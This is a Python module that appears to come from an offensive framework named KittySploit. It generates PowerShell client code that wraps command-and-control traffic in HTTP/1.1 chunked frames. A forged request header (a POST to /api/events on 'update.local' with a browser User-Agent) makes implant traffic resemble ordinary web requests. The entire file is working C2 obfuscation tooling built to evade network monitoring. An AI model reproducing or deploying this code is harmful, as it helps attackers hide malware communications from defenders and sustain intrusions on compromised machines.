#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from typing import Optional

from kittysploit import Transform
from modules.transforms.python.protocol.http_chunked import Module as PythonHttpChunkedTransform


class Module(Transform, PythonHttpChunkedTransform):
    """PowerShell HTTP chunked transfer mimic transform."""

    SUPPORTED_CLIENT_LANGUAGES = ["powershell"]

    __info__ = {
        "name": "PowerShell HTTP Chunked Mimic Transform",
        "description": "Wraps C2 bytes in HTTP/1.1 chunked transfer frames and emits PowerShell client code.",
        "author": "KittySploit Team",
        "version": "1.0.0",
    }

    def generate_client_code(self, language: str) -> Optional[str]:
        if language != "powershell":
            return None
        return (
            "$script:xfBuf=New-Object System.Collections.Generic.List[byte];$script:xfFirst=$true;\n"
            "$script:xfHeader=[Text.Encoding]::ASCII.GetBytes(\"POST /api/events HTTP/1.1`r`nHost: update.local`r`nUser-Agent: Mozilla/5.0`r`nContent-Type: application/octet-stream`r`nTransfer-Encoding: chunked`r`nConnection: keep-alive`r`n`r`n\");\n"
            "function _xf_encode([byte[]]$d){\n"
            " if($null -eq $d -or $d.Length -eq 0){return [byte[]]@()}\n"
            " $out=New-Object System.Collections.Generic.List[byte]\n"
            " if($script:xfFirst){$out.AddRange($script:xfHeader);$script:xfFirst=$false}\n"
            " $i=0\n"
            " while($i -lt $d.Length){$n=[Math]::Min(16384,$d.Length-$i);$chunk=New-Object byte[] $n;[Array]::Copy($d,$i,$chunk,0,$n);$i+=$n;$h=[Text.Encoding]::ASCII.GetBytes(([Convert]::ToString($n,16))+\"`r`n\");$out.AddRange($h);$out.AddRange($chunk);$out.AddRange([Text.Encoding]::ASCII.GetBytes(\"`r`n\"))}\n"
            " return $out.ToArray()\n"
            "}\n"
            "function _xf_decode([byte[]]$d){\n"
            " if($null -ne $d -and $d.Length -gt 0){$script:xfBuf.AddRange($d)}\n"
            " $out=New-Object System.Collections.Generic.List[byte]\n"
            " while($script:xfBuf.Count -gt 0){\n"
            "  $txt=[Text.Encoding]::ASCII.GetString($script:xfBuf.ToArray())\n"
            "  if($txt.StartsWith('HTTP/') -or $txt.StartsWith('POST ') -or $txt.StartsWith('GET ')){$e=$txt.IndexOf(\"`r`n`r`n\");if($e -lt 0){break};$script:xfBuf.RemoveRange(0,$e+4);continue}\n"
            "  $lineEnd=-1;for($j=0;$j -lt $script:xfBuf.Count-1;$j++){if($script:xfBuf[$j] -eq 13 -and $script:xfBuf[$j+1] -eq 10){$lineEnd=$j;break}}\n"
            "  if($lineEnd -lt 0){break}\n"
            "  $line=[Text.Encoding]::ASCII.GetString($script:xfBuf.GetRange(0,$lineEnd).ToArray()).Split(';')[0].Trim()\n"
            "  try{$ln=[Convert]::ToInt32($line,16)}catch{$script:xfBuf.RemoveAt(0);continue}\n"
            "  if($ln -gt 16384){$script:xfBuf.RemoveAt(0);continue}\n"
            "  $frameLen=$lineEnd+2+$ln+2;if($script:xfBuf.Count -lt $frameLen){break}\n"
            "  $payload=$script:xfBuf.GetRange($lineEnd+2,$ln).ToArray();$out.AddRange($payload);$script:xfBuf.RemoveRange(0,$frameLen)\n"
            " }\n"
            " return $out.ToArray()\n"
            "}\n"
        )
